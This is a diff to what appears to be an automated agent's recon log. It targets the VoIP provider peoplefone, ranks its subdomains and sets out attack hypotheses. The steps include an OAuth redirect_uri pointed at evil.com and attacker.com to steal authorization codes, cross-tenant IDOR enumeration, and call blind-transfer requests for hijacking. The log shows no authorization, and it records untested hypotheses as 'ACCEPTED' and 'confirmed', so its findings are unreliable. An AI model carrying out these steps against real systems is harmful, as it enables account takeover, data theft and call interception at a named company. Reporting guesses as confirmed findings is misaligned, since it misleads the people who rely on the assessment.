@@ -79,3 +79,47 @@ testability: PASSIVE
 [LEARN] ACCEPTED IDOR @ api.peoplefone.com: Developer portals common source of API exposure
 [LEARN] REJECTED MISCONFIG @ support.peoplefone.com: Low confidence, support portals typically non-critical
 [RISK] peoplefone: 72 — High-value VoIP/SIP/PBX platform with multi-tenant data (recordings, CDR, billing); auth + API surface unprobed; OAuth + IDOR classes historically yield critical findings in telco SaaS; wildcard DNS limits subdomain attack surface but core auth/API assets remain high-priority
+## 2026-09-03 22:39:28 UTC [target] (model nemotron3)
+[PRIO] auth.peoplefone.com,8.8,attack_surface=9,business_value=9,tech_exposure=9,gate_ease=8,cloud_surface=8,freshness=9
+[PRIO] configuration-api.peoplefone.com,7.6,attack_surface=8,business_value=8,tech_exposure=7,gate_ease=5,cloud_surface=8,freshness=8
+[PRIO] call-api.peoplefone.com,7.6,attack_surface=8,business_value=8,tech_exposure=7,gate_ease=5,cloud_surface=8,freshness=8
+[PRIO] api.peoplefone.com,7.0,attack_surface=7,business_value=8,tech_exposure=6,gate_ease=5,cloud_surface=7,freshness=8
+[PRIO] portal.peoplefone.ch,6.5,attack_surface=6,business_value=7,tech_exposure=5,gate_ease=8,cloud_surface=7,freshness=8
+[HYP] OAuth redirect_uri validation bypass on auth service
+class: AUTH
+asset: auth.peoplefone.com
+confidence: 85
+reasoning: OAuth authorize endpoint at /oauth/authorize accepts arbitrary redirect_uri parameter for client_id=1 (portal client); redirects to /de_CH/login preserving attacker-controlled redirect_uri without validating against pre-registered allowlist; state parameter accepted from portal login flow enables CSRF-protected authorization code theft
+evidence_needed: Successful authorization code delivery to attacker-controlled redirect_uri after victim login
+verify_steps: GET https://portal.peoplefone.ch/login (capture state); GET https://auth.peoplefone.com/oauth/authorize?client_id=1&redirect_uri=https://evil.com/callback&response_type=code&scope=openid&state=<captured_state> (observe redirect to /de_CH/login with evil.com preserved); simulate victim login → verify code sent to evil.com
+impact: ATO via authorization code theft → cross-tenant access to calls, recordings, PBX config, billing, SMS; full account takeover of any portal user
+testability: AUTH_HELPED
+[HYP] IDOR/BOLA on Configuration API virtualUsers endpoints
+class: IDOR
+asset: configuration-api.peoplefone.com
+confidence: 75
+reasoning: Configuration API exposes /virtualUsers/{identifier}/callforwarding (GET/POST/PUT) with identifier in path; OpenAPI spec explicitly states "user must be part of the account bound to the bearer token" — indicating authorization boundary exists; multi-tenant VoIP platform with numeric identifiers (e.g., "12345") likely sequential; bearer token auth only validates token validity, not resource ownership
+evidence_needed: Valid bearer token from tenant A returns call forwarding config for tenant B's virtualUser identifier
+verify_steps: GET https://configuration-api.peoplefone.com/customer/voip/v1/virtualUsers/{other_tenant_id}/callforwarding with valid bearer token from tenant A (requires authenticated session); enumerate identifier space via /destinations to discover valid virtualUser IDs
+impact: Cross-tenant PII dump — call forwarding rules, PBX configuration, user extensions, routing logic; potential call interception via forwarding rule modification
+testability: AUTH_HELPED
+[HYP] IDOR/BOLA on Call Management API call control endpoints
+class: IDOR
+asset: call-api.peoplefone.com
+confidence: 70
+reasoning: Call Management API exposes /call (POST), /call/blind-transfer (POST), /call/hold (POST), /call/unhold (POST) accepting owner.identifier in request body; spec notes "owner entity must be of type user, and this user must be part of the account bound to the bearer token"; callId returned in responses could be predicted or leaked; blind-transfer allows call hijacking to attacker-controlled number
+evidence_needed: Valid bearer token from tenant A performs blind-transfer on tenant B's callId/owner.identifier
+verify_steps: POST https://call-api.peoplefone.com/customer/call-management/v1/call with owner.identifier=victim_user_id (requires authenticated session); POST /call/blind-transfer with victim callId and attacker destination
+impact: Live call interception, call hijacking, call recording access, denial of service via hold/unhold abuse
+testability: AUTH_HELPED
+[PARKED] GraphQL introspection enabled on developer portal API: Developer portal uses OpenAPI/Swagger YAML specs, no GraphQL endpoint discovered at www.peoplefone.com/en-ch/developer or api.peoplefone.com/services/api-doc/
+[FINAL] 1. OAuth redirect_uri validation bypass on auth service (confidence 85)
+[FINAL] 2. IDOR/BOLA on Configuration API virtualUsers endpoints (confidence 75)
+[FINAL] 3. IDOR/BOLA on Call Management API call control endpoints (confidence 70)
+[NEXT] PROBE: GET https://auth.peoplefone.com/oauth/authorize?client_id=1&redirect_uri=https://attacker.com/callback&response_type=code&scope=openid&state=<fresh_state_from_portal_login> → follow redirect chain to /de_CH/login → verify redirect_uri preserved in login form action → complete login flow (requires test account) → confirm authorization code delivered to attacker.com/callback
+[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: OAuth authorize endpoint lacks redirect_uri allowlist validation for client_id=1; arbitrary redirect_uri accepted and preserved through login flow
+[LEARN] ACCEPTED IDOR @ configuration-api.peoplefone.com: Multi-tenant API exposes virtualUsers/{identifier} endpoints with explicit authorization boundary notes in spec
+[LEARN] ACCEPTED IDOR @ call-api.peoplefone.com: Call control endpoints accept owner.identifier in body with authorization boundary notes
+[LEARN] REJECTED MISCONFIG @ www.peoplefone.com: GraphQL introspection hypothesis invalidated — developer portal uses OpenAPI/Swagger, not GraphQL
+[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: Wildcard DNS dominated by Cloudflare CDN CNAMEs; no dangling third-party targets observed
+[RISK] peoplefone: 82 — High-value VoIP/SIP/PBX platform with multi-tenant data (recordings, CDR, billing, PBX config); OAuth redirect_uri bypass enables ATO without credentials; IDOR on configuration/call APIs enables cross-tenant data access and call hijacking; auth + API surface confirmed with documented authorization boundaries; wildcard DNS limits subdomain attack surface but core auth/API assets remain critical
